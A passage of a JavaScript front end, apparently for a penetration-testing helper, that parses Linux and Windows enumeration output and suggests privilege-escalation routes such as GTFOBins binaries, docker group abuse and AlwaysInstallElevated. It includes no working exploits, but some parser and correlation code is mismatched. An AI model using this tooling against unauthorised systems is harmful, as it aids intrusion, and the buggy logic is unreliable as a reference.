            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            graphData = await response.json();
            console.log("Graph data loaded:", graphData);
            populateNodeSelector();
            // Sélectionner le premier node par défaut si disponible
            if (nodeSelect.options.length > 1) {
                 nodeSelect.selectedIndex = 1; // Sélectionne le premier vrai node
                 handleNodeSelection(); // Déclenche la mise à jour initiale
            } else {
                updateActiveNodeInfo(null); // Aucun node disponible
                renderChecklist(null); // Vide la checklist
            }
        } catch (error) {
            console.error("Failed to load graph data:", error);
            parsingErrorEl.textContent = "Erreur critique: Impossible de charger les données des nodes.";
            displayCriticalError("Erreur critique: Impossible de charger les données des nodes depuis hostmanager_graph_export.json.");
            // Vider le sélecteur ou afficher un message d'erreur dedans
            nodeSelect.innerHTML = '<option value="">Erreur chargement</option>';
            throw error; // Renvoyer l'erreur pour arrêter l'initialisation si nécessaire
        }
    }

    async function loadKnowledgeBases() {
        console.log("Loading knowledge bases...");
        try {
            // Utiliser Promise.all pour charger en parallèle
            const [gtfoResponse, lolbasResponse /*, patternsResponse */] = await Promise.all([
                fetch('/assets/data/gtfobins.json').catch(e => { console.error("Failed to fetch GTFOBins", e); return null; }), // Gérer les erreurs individuelles
                fetch('/assets/data/lolbas.json').catch(e => { console.error("Failed to fetch LOLBAS", e); return null; })
                // fetch('/assets/data/suspicious_patterns.json') // Charger depuis JSON externe si nécessaire
            ]);

            if (gtfoResponse?.ok) knowledgeBases.gtfobins = await gtfoResponse.json();
            if (lolbasResponse?.ok) knowledgeBases.lolbas = await lolbasResponse.json();
            // knowledgeBases.suspiciousPatterns = patternsResponse.ok ? await patternsResponse.json() : SUSPICIOUS_PATTERNS; // Charger depuis JSON ou utiliser la constante
            knowledgeBases.suspiciousPatterns = SUSPICIOUS_PATTERNS; // Utiliser la constante interne pour l'instant

            console.log("Knowledge bases loaded:", knowledgeBases);
        } catch (error) {
            console.error("Failed to load one or more knowledge bases:", error);
            parsingErrorEl.textContent = "Avertissement: Impossible de charger certaines bases de connaissances (GTFOBins/LOLBAS).";
            // Continuer même si les KB ne sont pas chargées ? Ou afficher une erreur critique ?
        }
    }

    // --- Node Selection and UI Update ---
    function populateNodeSelector() {
        nodeSelect.innerHTML = '<option value="">-- Sélectionner un Node --</option>'; // Reset
        if (!graphData || !graphData.nodes) {
            console.error("Graph data is invalid for populating selector.");
            return;
        }
        for (const nodeId in graphData.nodes) {
            const node = graphData.nodes[nodeId];
            const option = document.createElement('option');
            option.value = nodeId;
            option.textContent = node.ipName || nodeId; // Utiliser ipName si disponible
            nodeSelect.appendChild(option);
        }
        console.log("Node selector populated.");
    }

    function handleNodeSelection() {
        currentNodeId = nodeSelect.value;
        console.log(`Node selected: ${currentNodeId}`);
        if (currentNodeId && graphData && graphData.nodes[currentNodeId]) {
            currentNodeData = graphData.nodes[currentNodeId];
            updateActiveNodeInfo(currentNodeData);
            renderChecklist(currentNodeData.os);
            loadChecklistState(); // Charger l'état après le rendu
            renderFindings(); // Afficher les findings existants pour ce node
            renderSuggestions(); // Afficher les suggestions existantes pour ce node
            clearDetailsPanel(); // Vider le panneau de détails
        } else {
            currentNodeData = null;
            updateActiveNodeInfo(null);
            renderChecklist(null); // Vide la checklist
            clearFindings();
            clearSuggestions();
            clearDetailsPanel();
        }
    }

    function updateActiveNodeInfo(node) {
        if (node) {
            const tagsHtml = node.tags && node.tags.length > 0
                ? node.tags.map(tag => `<span class="badge bg-secondary me-1">${escapeHtml(tag)}</span>`).join('')
                : 'Aucun';
            activeNodeInfoEl.innerHTML = `
                <strong>OS:</strong> ${escapeHtml(node.os || 'N/A')} |
                <strong>User:</strong> ${escapeHtml(node.currentUser || 'N/A')} |
                <strong>Arch:</strong> ${escapeHtml(node.arch || 'N/A')} |
                <strong>Tags:</strong> ${tagsHtml}
            `;
        } else {
            activeNodeInfoEl.innerHTML = 'OS: - | User: - | Arch: - | Tags: -';
        }
    }

    // --- Tab Management ---
    function switchTab(tabId) {
        console.log(`Switching to tab: ${tabId}`);
        tabPanes.forEach(pane => {
            pane.classList.toggle('active', pane.id === tabId);
        });
        leftPanelTabs.forEach(tab => {
            tab.classList.toggle('active', tab.dataset.tab === tabId);
        });
    }

    // --- Placeholder Loading ---
    function loadPlaceholder(type) {
        if (PLACEHOLDERS[type]) {
            rawOutputInput.value = PLACEHOLDERS[type];
            // Essayer de deviner le type d'output pour le select
            if (outputTypeSelect.querySelector(`option[value="${type}"]`)) {
                outputTypeSelect.value = type;
            } else {
                 outputTypeSelect.value = 'auto';
            }
            console.log(`Loaded placeholder for: ${type}`);
        }
    }

    // --- Parsing Logic ---
    function parseRawOutput() {
        if (!currentNodeId) {
            parsingErrorEl.textContent = "Veuillez d'abord sélectionner un node cible.";
            return;
        }
        const rawOutput = rawOutputInput.value.trim();
        if (!rawOutput) {
            parsingErrorEl.textContent = "Veuillez coller un output à analyser.";
            return;
        }

        console.log(`Parsing output for node: ${currentNodeId}`);
        parsingErrorEl.textContent = '';
        showLoadingIndicator(true, 'parsing');

        // Utiliser setTimeout pour permettre à l'UI de se mettre à jour (afficher le spinner)
        setTimeout(() => {
            try {
                const outputType = outputTypeSelect.value;
                // TODO: Implémenter la logique de parsing réelle basée sur outputType ou auto-détection
                // Pour l'instant, simulation simple
                const results = parseOutputContent(rawOutput, outputType, currentNodeData.os);

                // Stocker les résultats pour le node courant
                if (!parsedFindings[currentNodeId]) {
                    parsedFindings[currentNodeId] = {};
                }
                // Fusionner les nouveaux résultats avec les anciens (ou remplacer ?)
                // Pour l'instant, on fusionne en ajoutant/remplaçant par type
                for (const type in results) {
                    parsedFindings[currentNodeId][type] = results[type];
                }

                console.log("Parsing complete. Findings:", parsedFindings[currentNodeId]);
                renderFindings(); // Mettre à jour l'onglet Findings
                switchTab('findings-tab'); // Aller à l'onglet Findings
                correlateAndSuggest(); // Lancer la corrélation après le parsing

            } catch (error) {
                console.error("Parsing failed:", error);
                parsingErrorEl.textContent = `Erreur lors de l'analyse: ${error.message}`;
            } finally {
                showLoadingIndicator(false, 'parsing');
            }
        }, 50); // Court délai
    }

    // Fonction de parsing principale (à développer)
    function parseOutputContent(output, typeHint, os) {
        console.log(`Attempting to parse output (Hint: ${typeHint}, OS: ${os})`);
        let findings = {};
        const lines = output.split('\n');

        // 1. Détection Auto (si typeHint === 'auto')
        if (typeHint === 'auto') {
            // TODO: Ajouter des heuristiques plus robustes pour détecter le type
            if (output.includes("sudo: unable to resolve host") || output.includes("may run the following commands")) typeHint = 'sudo';
            else if (output.includes("find: ") && output.includes("Permission denied")) typeHint = 'suid'; // Très basique
            else if (output.includes("Nom du système d'exploitation:")) typeHint = 'systeminfo';
            else if (output.includes("PRIVILEGES INFORMATION")) typeHint = 'whoami_priv';
            else if (output.includes("[+] Basic Information")) typeHint = 'linpeas'; // Exemple
            console.log(`Auto-detected type as: ${typeHint}`);
        }

        // 2. Parsing Spécifique
        if (os === 'Linux') {
            if (typeHint === 'sudo' || typeHint === 'auto') findings.sudo = parseSudoL(lines);
            if (typeHint === 'suid' || typeHint === 'auto') findings.suid = parseSuid(lines);
            if (typeHint === 'caps' || typeHint === 'auto') findings.capabilities = parseCapabilities(lines);
            // Ajouter parsing LinPEAS, etc.
        } else if (os === 'Windows') {
            if (typeHint === 'systeminfo' || typeHint === 'auto') findings.systemInfo = parseSystemInfo(lines);
            if (typeHint === 'whoami_priv' || typeHint === 'auto') findings.windowsPrivileges = parseWhoamiPriv(lines);
            // Ajouter parsing WinPEAS, PowerUp, etc.
        }

        // TODO: Ajouter des parsers plus génériques ou pour les types 'auto' non détectés

        return findings;
    }

    // --- Fonctions de Parsing Spécifiques (Exemples) ---

    function parseSudoL(lines) {
        const rules = [];
        const sudoRegex = /^\s*\((\S+)\s*(?::\s*(\S+))?\)\s*(NOPASSWD:)?\s*(.*)$/i;
        let userSection = false;
        for (const line of lines) {
            if (line.includes("may run the following commands")) {
                userSection = true;
                continue;
            }
            if (!userSection) continue;

            const match = line.trim().match(sudoRegex);
            if (match) {
                rules.push({
                    runAsUser: match[1],
                    runAsGroup: match[2] || null,
                    noPasswd: !!match[3],
                    command: match[4].trim()
                });
            }
        }
        return rules;
    }

    function parseSuid(lines) {
        const files = [];
        // Regex simple pour trouver les chemins absolus (peut être améliorée)
        const pathRegex = /^\/[^\s]+$/;
        for (const line of lines) {
            const trimmedLine = line.trim();
            if (pathRegex.test(trimmedLine) && !trimmedLine.includes('Permission denied') && !trimmedLine.includes('No such file')) {
                files.push(trimmedLine);
            }
        }
        return files;
    }

     function parseCapabilities(lines) {
        const caps = [];
        const capRegex = /^(\S+)\s+=\s+(.*)$/;
        for (const line of lines) {
            const match = line.trim().match(capRegex);
            if (match) {
                caps.push({ path: match[1], capabilities: match[2] });
            }
        }
        return caps;
    }

    function parseSystemInfo(lines) {
        const info = { raw: lines.join('\n') }; // Garder le brut pour affichage
        // Extraire quelques infos clés si nécessaire
        for (const line of lines) {
            if (line.startsWith("Nom du système d'exploitation:")) info.osName = line.split(':').slice(1).join(':').trim();
            if (line.startsWith("Version du système:")) info.osVersion = line.split(':').slice(1).join(':').trim();
            if (line.startsWith("Type du système:")) info.osArch = line.split(':').slice(1).join(':').trim();
        }
        return info;
    }

    function parseWhoamiPriv(lines) {
        const privileges = [];
        const privRegex = /^([a-zA-Z0-9_]+)\s+(.*?)\s+(Enabled|Disabled)$/;
        let startParsing = false;
        for (const line of lines) {
            if (line.startsWith('=============================')) {
                startParsing = true;
                continue;
            }
            if (!startParsing) continue;
            const match = line.trim().match(privRegex);
            if (match) {
                privileges.push({
                    name: match[1],
                    description: match[2].trim(),
                    status: match[3]
                });
            }
        }
        return privileges;
    }


    // --- Findings Rendering ---
    function renderFindings() {
        findingsTab.innerHTML = ''; // Clear previous findings
        const nodeFindings = parsedFindings[currentNodeId];

        if (!nodeFindings || Object.keys(nodeFindings).length === 0) {
            findingsTab.innerHTML = '<p class="text-muted">Aucun résultat d\'analyse pour ce node.</p>';
            return;
        }

        console.log(`Rendering findings for node ${currentNodeId}:`, nodeFindings);
        const ul = document.createElement('ul');
        ul.className = 'list-unstyled'; // Use Bootstrap class

        for (const type in nodeFindings) {
            const findingsList = nodeFindings[type];
            if (!findingsList || (Array.isArray(findingsList) && findingsList.length === 0)) continue;

            const li = document.createElement('li');
            li.className = 'mb-3'; // Margin bottom

            const title = document.createElement('h6');
            title.className = 'text-primary'; // Style title
            title.textContent = `Résultats: ${type.charAt(0).toUpperCase() + type.slice(1)}`;
            li.appendChild(title);

            const contentDiv = document.createElement('div');
            contentDiv.className = 'finding-content ps-2'; // Indentation

            if (type === 'systemInfo' && typeof findingsList.raw === 'string') {
                 // Affichage spécial pour systeminfo brut
                 const pre = document.createElement('pre');
                 pre.textContent = findingsList.raw;
                 contentDiv.appendChild(pre);
            } else if (Array.isArray(findingsList)) {
                findingsList.forEach(item => {
                    const itemEl = document.createElement('div');
                    itemEl.className = 'finding-item mb-1'; // Style each item
                    let itemHtml = '';
                    let suspiciousInfo = null;

                    // Formatage basé sur le type
                    if (type === 'sudo' && typeof item === 'object') {
                        itemHtml = `User: <strong>${escapeHtml(item.runAsUser)}</strong> ${item.runAsGroup ? `(Group: ${escapeHtml(item.runAsGroup)})` : ''} ${item.noPasswd ? '<strong class="text-danger">NOPASSWD</strong>' : ''} -> <code>${escapeHtml(item.command)}</code>`;
                        suspiciousInfo = checkSuspicious('sudo', item.command) || (item.noPasswd ? checkSuspicious('sudo', 'NOPASSWD:') : null);
                    } else if (type === 'suid' && typeof item === 'string') {
                        itemHtml = `<code>${escapeHtml(item)}</code>`;
                        suspiciousInfo = checkSuspicious('suid', item);
                    } else if (type === 'capabilities' && typeof item === 'object') {
                         itemHtml = `<code>${escapeHtml(item.path)}</code> = ${escapeHtml(item.capabilities)}`;
                         suspiciousInfo = checkSuspicious('capabilities', item.capabilities);
                    } else if (type === 'windowsPrivileges' && typeof item === 'object') {
                        itemHtml = `<strong>${escapeHtml(item.name)}</strong> (${escapeHtml(item.description)}): <span class="${item.status === 'Enabled' ? 'text-success' : 'text-muted'}">${item.status}</span>`;
                        suspiciousInfo = checkSuspicious('windowsPrivileges', item); // Pass the object
                    }
                    // Add more types as needed
                    else {
                        itemHtml = escapeHtml(JSON.stringify(item)); // Fallback
                    }

                    // Ajouter indicateur suspect
                    if (suspiciousInfo) {
                        const riskClass = suspiciousInfo.risk === 'High' ? 'text-danger' : 'text-warning';
                        itemHtml += ` <span class="${riskClass}" title="${escapeHtml(suspiciousInfo.message)}"><i class="fas fa-exclamation-triangle"></i></span>`;
                    }

                    itemEl.innerHTML = itemHtml;
                    contentDiv.appendChild(itemEl);
                });
            } else {
                 // Fallback pour les types non gérés spécifiquement
                 const p = document.createElement('p');
                 p.textContent = JSON.stringify(findingsList, null, 2);
                 contentDiv.appendChild(p);
            }

            li.appendChild(contentDiv);
            ul.appendChild(li);
        }
        findingsTab.appendChild(ul);
    }

     function clearFindings() {
        findingsTab.innerHTML = '<p class="text-muted">Les résultats de l\'analyse pour ce node apparaîtront ici.</p>';
        if (parsedFindings[currentNodeId]) {
            delete parsedFindings[currentNodeId]; // Clear stored findings for the node
        }
    }


    // --- Correlation and Suggestion Logic ---
    function correlateAndSuggest() {
        if (!currentNodeId || !currentNodeData) {
            console.warn("Cannot correlate, no current node selected.");
            return;
        }
        console.log(`Correlating findings for node ${currentNodeId} (${currentNodeData.ipName})`);
        showLoadingIndicator(true, 'correlation');
        correlationErrorEl.textContent = '';
        potentialVectors = []; // Reset suggestions for the current node

        const findings = parsedFindings[currentNodeId] || {};
        const nodeOS = currentNodeData.os; // Linux or Windows

        try {
            // --- Linux Specific Correlations ---
            if (nodeOS === 'Linux') {
                // 1. Sudo rules
                if (findings.sudo) {
                    findings.sudo.forEach(sudoEntry => { // Iterate over each entry from parseSudoOutput
                        if (sudoEntry.commands && Array.isArray(sudoEntry.commands)) {
                            sudoEntry.commands.forEach(rule => { // NOW iterate over the actual commands
                                const gtfobin = checkGtfobins(rule.command, 'sudo');
                                if (gtfobin) {
                                    potentialVectors.push({
                                        techniqueName: `Sudo GTFOBins: ${rule.command.split('/').pop()}`,
                                        description: `Le binaire ${gtfobin.binary} peut être abusé via sudo (${gtfobin.functions.join(', ')}). ${rule.noPasswd ? 'Exécution NOPASSWD !' : ''}`,
                                        findingSource: 'sudo -l',
                                        kbSource: 'GTFOBins',
                                        risk: rule.noPasswd ? 'High' : 'Medium',
                                        impact: 'Potentiellement Root',
                                        context: { type: 'sudo', path: gtfobin.binary, functions: gtfobin.functions, noPasswd: rule.noPasswd },
                                        nodeId: currentNodeId
                                    });
                                }
                                // Add check for suspicious patterns on the command itself if needed
                                const suspicious = checkSuspicious('sudo', rule.command); // Check command path
                                if (suspicious && !gtfobin) { // Avoid duplicate if already found by GTFOBins
                                     potentialVectors.push({
                                         techniqueName: `Sudo Suspect: ${rule.command.split('/').pop()}`,
                                         description: suspicious.message + (rule.noPasswd ? ' (NOPASSWD)' : ''),
                                         findingSource: 'sudo -l',
                                         kbSource: 'Patterns Internes',
                                         risk: rule.noPasswd ? 'High' : suspicious.risk, // Elevate risk if NOPASSWD
                                         impact: 'Potentiellement Root',
                                         context: { type: 'sudo', path: rule.command, noPasswd: rule.noPasswd },
                                         nodeId: currentNodeId
                                     });
                                }
                            });
                        }
                    });
                }

                // 2. SUID binaries
                if (findings.suid) {
                    findings.suid.forEach(path => {
                        const gtfobin = checkGtfobins(path, 'suid');
                        if (gtfobin) {
                            potentialVectors.push({
                                techniqueName: `SUID GTFOBins: ${path.split('/').pop()}`,
                                description: `Le binaire SUID ${gtfobin.binary} peut être abusé (${gtfobin.functions.join(', ')}).`,
                                findingSource: 'find SUID',
                                kbSource: 'GTFOBins',
                                risk: 'High',
                                impact: 'Potentiellement Root',
                                context: { type: 'suid', path: gtfobin.binary, functions: gtfobin.functions },
                                nodeId: currentNodeId
                            });
                        }
                        const suspicious = checkSuspicious('suid', path);
                        if (suspicious && !gtfobin) {
                             potentialVectors.push({
                                 techniqueName: `SUID Suspect: ${path.split('/').pop()}`,
                                 description: suspicious.message,
                                 findingSource: 'find SUID',
                                 kbSource: 'Patterns Internes',
                                 risk: suspicious.risk,
                                 impact: 'Potentiellement Root',
                                 context: { type: 'suid', path: path },
                                 nodeId: currentNodeId
                             });
                        }
                    });
                }

                // 3. Capabilities
                if (findings.capabilities) {
                     findings.capabilities.forEach(capLine => { // capLine is like "/usr/bin/python3.8 = cap_sys_admin+ep"
                         const parts = capLine.split(' = ');
                         if (parts.length === 2) {
                             const path = parts[0].trim();
                             const caps = parts[1].trim();
                             const gtfobin = checkGtfobins(path, 'capabilities');
                             if (gtfobin) {
                                 potentialVectors.push({
                                     techniqueName: `Capabilities GTFOBins: ${path.split('/').pop()}`,
                                     description: `Le binaire ${gtfobin.binary} avec capabilities (${caps}) peut être abusé (${gtfobin.functions.join(', ')}).`,
                                     findingSource: 'getcap',
                                     kbSource: 'GTFOBins',
                                     risk: 'High',
                                     impact: 'Potentiellement Root',
                                     context: { type: 'capabilities', path: gtfobin.binary, capabilities: caps, functions: gtfobin.functions },
                                     nodeId: currentNodeId
                                 });
                             }
                             const suspicious = checkSuspicious('capabilities', capLine);
                             if (suspicious && !gtfobin) {
                                  potentialVectors.push({
                                      techniqueName: `Capabilities Suspectes: ${path.split('/').pop()}`,
                                      description: `${suspicious.message} (${caps})`,
                                      findingSource: 'getcap',
                                      kbSource: 'Patterns Internes',
                                      risk: suspicious.risk,
                                      impact: 'Potentiellement Root',
                                      context: { type: 'capabilities', path: path, capabilities: caps },
                                      nodeId: currentNodeId
                                  });
                             }
                         }
                     });
                 }

                // 4. Cron Jobs (Basic check for writable scripts mentioned in cron)
                if (findings.cron && findings.writableFiles) {
                    findings.cron.forEach(job => {
                        // Extract script/command path from cron job string (simplistic)
                        const commandMatch = job.match(/(?:^|\s)(\/[^ ]+)/); // Find first absolute path
                        if (commandMatch) {
                            const scriptPath = commandMatch[1];
                            if (findings.writableFiles.some(writable => writable.path === scriptPath && writable.access.includes('w'))) {
                                potentialVectors.push({
                                    techniqueName: `Cron Job Hijacking: ${scriptPath.split('/').pop()}`,
                                    description: `Le script cron '${scriptPath}' exécuté par '${job.split(' ')[4]}' est inscriptible par l'utilisateur actuel.`,
                                    findingSource: 'Cron / Writable Files',
                                    kbSource: 'Logic',
                                    risk: 'High',
                                    impact: `Privilèges de l'utilisateur '${job.split(' ')[4]}'`,
                                    context: { type: 'cron', job: job, writablePath: scriptPath },
                                    nodeId: currentNodeId
                                });
                            }
                        }
                    });
                }

                 // 5. Docker Socket/Group
                 if (findings.dockerGroup) {
                     potentialVectors.push({
                         techniqueName: "Docker Group Abuse",
                         description: "L'utilisateur fait partie du groupe 'docker', permettant une escalade facile vers root.",
                         findingSource: "id / groups",
                         kbSource: "Common Linux Privesc",
                         risk: "Critical",
                         impact: "Root",
                         context: { type: 'docker', method: 'group' },
                         nodeId: currentNodeId
                     });
                 }
                 if (findings.dockerSocketWritable) {
                      potentialVectors.push({
                          techniqueName: "Docker Socket Abuse",
                          description: "Le socket Docker est accessible/inscriptible, permettant une escalade vers root.",
                          findingSource: "File Permissions",
                          kbSource: "Common Linux Privesc",
                          risk: "Critical",
                          impact: "Root",
                          context: { type: 'docker', method: 'socket' },
                          nodeId: currentNodeId
                      });
                 }


            }
            // --- Windows Specific Correlations ---
            else if (nodeOS === 'Windows') {
                // 1. Privileges (SeImpersonate, SeBackup, etc.)
                if (findings.windowsPrivileges) {
                    findings.windowsPrivileges.forEach(priv => {
                        const suspicious = checkSuspicious('windowsPrivileges', priv);
                        if (suspicious) {
                            potentialVectors.push({
                                techniqueName: `Privilège Windows Abusable: ${priv.name}`,
                                description: suspicious.message,
                                findingSource: 'whoami /priv',
                                kbSource: 'Patterns Internes / LOLBAS', // Could link to LOLBAS later
                                risk: suspicious.risk,
                                impact: 'Potentiellement SYSTEM',
                                context: { type: 'privilege', name: priv.name, status: priv.status },
                                nodeId: currentNodeId
                            });
                        }
                    });
                }

                // 2. Unquoted Service Paths
                if (findings.unquotedServicePaths) {
                    findings.unquotedServicePaths.forEach(serviceInfo => { // Assuming serviceInfo = { name: '...', path: '...' }
                         potentialVectors.push({
                             techniqueName: `Unquoted Service Path: ${serviceInfo.name}`,
                             description: `Le chemin du service '${serviceInfo.path}' n'est pas entre guillemets, permettant potentiellement l'injection de binaire.`,
                             findingSource: 'WMIC / PowerUp',
                             kbSource: 'Common Windows Privesc',
                             risk: 'Medium', // Risk depends on permissions in the path
                             impact: 'Potentiellement SYSTEM',
                             context: { type: 'unquotedPath', serviceName: serviceInfo.name, path: serviceInfo.path },
                             nodeId: currentNodeId
                         });
                    });
                }

                // 3. AlwaysInstallElevated
                if (findings.alwaysInstallElevated) {
                     potentialVectors.push({
                         techniqueName: "AlwaysInstallElevated",
                         description: "Les clés de registre AlwaysInstallElevated sont activées, permettant l'installation de MSI malveillants avec privilèges SYSTEM.",
                         findingSource: 'Registry Query / PowerUp',
                         kbSource: 'Common Windows Privesc',
                         risk: 'High',
                         impact: 'SYSTEM',
                         context: { type: 'alwaysInstallElevated' },
                         nodeId: currentNodeId
                     });
                }

                 // 4. Weak Service Permissions (Basic check - needs more detail from parser)
                 if (findings.weakServicePermissions) {
                     findings.weakServicePermissions.forEach(serviceInfo => { // Assuming serviceInfo = { name: '...', permissions: '...' }
                         potentialVectors.push({
                             techniqueName: `Permissions de Service Faibles: ${serviceInfo.name}`,
                             description: `Permissions faibles détectées pour le service '${serviceInfo.name}'. Vérifiez si SERVICE_CHANGE_CONFIG ou SERVICE_ALL_ACCESS est accordé.`,
                             findingSource: 'accesschk / PowerUp',
                             kbSource: 'Common Windows Privesc',
                             risk: 'High', // If exploitable permissions exist
                             impact: 'Potentiellement SYSTEM',
                             context: { type: 'weakServicePerms', serviceName: serviceInfo.name, details: serviceInfo.permissions },
                             nodeId: currentNodeId
                         });
                     });
                 }

                 // 5. Stored Credentials (Generic suggestion)
                 if (findings.storedCredentials) { // Assuming this is just a flag or list of locations
                      potentialVectors.push({
                          techniqueName: "Vérifier les Identifiants Stockés",
                          description: "Des identifiants pourraient être stockés dans le registre (Winlogon, PuTTY), fichiers de config, historique PS, etc.",
                          findingSource: "Generic Check / PowerUp",
                          kbSource: "Common Windows Privesc",
                          risk: "Medium",
                          impact: "Potentiellement autres comptes / SYSTEM",
                          context: { type: 'storedCreds', locations: findings.storedCredentials }, // locations might be an array
                          nodeId: currentNodeId
                      });
                 }

            }

            // --- General Correlations (Applicable to both OS, if data exists) ---
            // Example: Correlate writable sensitive files with current user context
            if (findings.writableFiles && currentNodeData?.currentUser) {
                 findings.writableFiles.forEach(file => {
                     const suspicious = checkSuspicious('writableFiles', file.path); // Check if path matches known sensitive files
                     if (suspicious) {
                         potentialVectors.push({
                             techniqueName: `Fichier Sensible Inscriptible: ${file.path.split(/[\\/]/).pop()}`,
                             description: `Le fichier sensible '${file.path}' est inscriptible par l'utilisateur '${currentNodeData.currentUser}'. ${suspicious.message}`,
                             findingSource: 'File Permissions Scan',
                             kbSource: 'Patterns Internes',
                             risk: suspicious.risk,
                             impact: 'Potentiellement élevé (selon le fichier)',
                             context: { type: 'writableFile', path: file.path, access: file.access },
                             nodeId: currentNodeId
                         });
                     }
                 });
             }


            // Prioritize and sort suggestions (simple example: High > Medium > Low)
            potentialVectors.sort((a, b) => {
                const riskOrder = { 'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1 };
                return (riskOrder[b.risk] || 0) - (riskOrder[a.risk] || 0);
            });

        } catch (error) {
            console.error("Correlation failed:", error);
            correlationErrorEl.textContent = `Erreur de corrélation: ${error.message}`;
            potentialVectors = []; // Clear potentially incomplete suggestions
        } finally {
            renderSuggestions(potentialVectors);
            showLoadingIndicator(false, 'correlation');
            console.log("Correlation finished. Suggestions:", potentialVectors);
        }
    }

    // --- Suggestions Rendering ---
    function renderSuggestions(suggestions) {
        exploitationSuggestionsEl.innerHTML = ''; // Clear previous suggestions

        if (!suggestions || suggestions.length === 0) {
            exploitationSuggestionsEl.innerHTML = '<p class="text-muted">Aucune suggestion d\'exploitation pour le moment.</p>';
            return;
        }

        console.log("Rendering suggestions:", suggestions);
        suggestions.forEach((vector, index) => {
            const card = document.createElement('div');
            card.className = 'suggestion-card mb-2'; // Added margin
            card.dataset.vectorIndex = index; // Store index to retrieve data on click

            // Determine indicator based on priority/risk
            let indicatorIcon = 'fa-lightbulb';
            let indicatorClass = 'text-info';
            if (vector.risk === 'High') { indicatorIcon = 'fa-bomb'; indicatorClass = 'text-danger'; }
            else if (vector.risk === 'Medium') { indicatorIcon = 'fa-triangle-exclamation'; indicatorClass = 'text-warning'; }

            card.innerHTML = `
                <div class="suggestion-card-header">
                    <span class="indicator ${indicatorClass}" title="Priorité: ${vector.risk || 'N/A'}">
                        <i class="fas ${indicatorIcon}"></i> ${vector.risk || ''}
                    </span>
                    <strong>${escapeHtml(vector.techniqueName)}</strong>
                </div>
                <div class="suggestion-card-body">
                    <p>${escapeHtml(vector.description)}</p>
                    ${vector.exploitationCommand ? `<pre class="suggestion-code-preview"><code>${escapeHtml(vector.exploitationCommand)}</code></pre>` : ''}
                    <small class="source">Source: <a href="${vector.sourceLink || '#'}" target="_blank" rel="noopener noreferrer">${escapeHtml(vector.source)}</a> | Impact: ${escapeHtml(vector.impact || 'N/A')}</small>
                </div>
            `;
            exploitationSuggestionsEl.appendChild(card);
        });
    }

     function clearSuggestions() {
        exploitationSuggestionsEl.innerHTML = '<p class="text-muted">Les suggestions apparaîtront après l\'analyse.</p>';
        potentialVectors = []; // Clear stored suggestions
    }

    function handleSuggestionClick(event) {
        const card = event.target.closest('.suggestion-card');
        if (card) {
            const index = parseInt(card.dataset.vectorIndex, 10);
            const vector = potentialVectors[index];

            // Remove 'selected' class from all cards
            document.querySelectorAll('.suggestion-card').forEach(c => c.classList.remove('selected'));
            // Add 'selected' class to the clicked card
            card.classList.add('selected');


            if (vector && currentNodeData) {
                console.log("Displaying details for vector:", vector);
                displayExploitationGuide(vector, currentNodeData);
            } else {
                 console.error("Could not find vector data or node data for clicked suggestion.");
                 clearDetailsPanel();
            }
        }
    }


    // --- Checklist Management ---
    function renderChecklist() {
        if (!currentNodeData) {
            checklistTab.innerHTML = '<p class="text-muted small">Sélectionnez un node pour voir la checklist.</p>';
            return;
        }

        const os = currentNodeData.os.toLowerCase(); // 'linux' or 'windows'
        const checklistData = CHECKLIST_DATA[os];
        const checklistContainer = document.getElementById('checklist-tab'); // Cibler le div interne

        if (!checklistData || !checklistContainer) {
            checklistContainer.innerHTML = `<p class="text-danger small">Checklist non disponible pour l'OS: ${currentNodeData.os}</p>`;
            return;
        }

        let checklistHtml = `<ul class="list-unstyled checklist-list mt-2">`;
        checklistData.forEach(item => {
            checklistHtml += `
                <li class="mb-1">
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" value="${item.id}" id="check-${item.id}" data-item-id="${item.id}">
                        <label class="form-check-label small" for="check-${item.id}">
                            ${escapeHtml(item.label)}
                        </label>
                    </div>
                    <div class="details text-muted small ps-4">${escapeHtml(item.details)}</div>
                </li>`;
        });
        checklistHtml += `</ul>`;

        checklistContainer.innerHTML = checklistHtml;
        loadChecklistState(); // Charger l'état après avoir rendu le HTML
    }

    function handleChecklistChange(event) {
        if (event.target.matches('.form-check-input[type="checkbox"]')) {
            const itemId = event.target.dataset.itemId;
            const isChecked = event.target.checked;
            console.log(`Checklist item ${itemId} changed to ${isChecked} for node ${currentNodeId}`);
            saveChecklistState();
        }
    }

    function saveChecklistState() {
        if (!currentNodeId) return;
        const checklistContainer = document.getElementById('checklist-tab');
        const checkboxes = checklistContainer.querySelectorAll('.form-check-input[type="checkbox"]');
        const state = {};
        checkboxes.forEach(cb => {
            state[cb.dataset.itemId] = cb.checked;
        });
        try {
            localStorage.setItem(`privescChecklist_${currentNodeId}`, JSON.stringify(state));
            console.log(`Checklist state saved for node ${currentNodeId}`);
        } catch (e) {
            console.error("Failed to save checklist state to localStorage:", e);
            // Peut-être afficher une erreur non bloquante à l'utilisateur
        }
    }

    function loadChecklistState() {
        if (!currentNodeId) return;
        const checklistContainer = document.getElementById('checklist-tab');
        try {
            const savedState = localStorage.getItem(`privescChecklist_${currentNodeId}`);
            if (savedState) {
                const state = JSON.parse(savedState);
                Object.keys(state).forEach(itemId => {
                    const checkbox = checklistContainer.querySelector(`.form-check-input[data-item-id="${itemId}"]`);
                    if (checkbox) {
                        checkbox.checked = state[itemId];
                    }
                });
                console.log(`Checklist state loaded for node ${currentNodeId}`);
            } else {
                 console.log(`No saved checklist state found for node ${currentNodeId}`);
            }
        } catch (e) {
            console.error("Failed to load or parse checklist state from localStorage:", e);
            // Effacer l'état potentiellement corrompu ?
            // localStorage.removeItem(`privescChecklist_${currentNodeId}`);
        }
    }

    // --- Exploitation Guide Display ---
    function clearDetailsPanel() {
        detailsContentEl.innerHTML = '<p class="text-muted">Cliquez sur une suggestion pour voir le guide détaillé.</p>';
         // Remove 'selected' class from all suggestion cards
         document.querySelectorAll('.suggestion-card').forEach(c => c.classList.remove('selected'));
    }

    function displayExploitationGuide(vector, nodeData) {
        console.log("Generating exploitation guide for:", vector.techniqueName);
        detailsContentEl.innerHTML = ''; // Clear previous content

        // Basic structure
        const guideHtml = `
            <div class="exploitation-guide">
                <h4>
                    <i class="fas fa-book-reader"></i> ${escapeHtml(vector.techniqueName)}
                    <span class="badge os-badge-${nodeData.os?.toLowerCase()} ms-2">${escapeHtml(nodeData.os)}</span>
                    ${nodeData.arch ? `<span class="badge arch-badge">${escapeHtml(nodeData.arch)}</span>` : ''}
